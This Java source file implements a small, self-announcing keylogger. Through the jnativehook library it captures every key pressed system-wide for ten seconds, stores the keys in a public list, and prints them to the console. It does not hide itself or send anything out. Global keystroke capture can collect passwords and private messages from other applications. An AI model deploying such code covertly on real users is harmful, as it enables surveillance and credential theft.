package services;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;

import java.util.ArrayList;

public class KeyLogger implements NativeKeyListener{
    public ArrayList<String> logs = new ArrayList<String>();

    private void addLog(String log) {
        logs.add(log);
    }

    public void clearLogs() {
        logs = new ArrayList<String>();
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        addLog(NativeKeyEvent.getKeyText(e.getKeyCode()) + " ");
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    public void nativeKeyReleased(NativeKeyEvent e) {

    }

    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    public static void main(String[] args) {
        KeyLogger keyLogger = new KeyLogger();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        // Add the KeyLogger as a listener to receive key events
        GlobalScreen.addNativeKeyListener(keyLogger);

        System.out.println("Keylogger is running. Press keys to log them.");

        // Wait for user to press keys
        try {
            Thread.sleep(10000); // Keep the program running for 10 seconds
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        // Unregister the listener and clean up
        GlobalScreen.removeNativeKeyListener(keyLogger);
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem unregistering the native hook.");
            System.err.println(ex.getMessage());
        }

        // Display the logged keys
        System.out.println("Logged keys: ");
        for (String log : keyLogger.logs) {
            System.out.print(log);
        }
    }
}
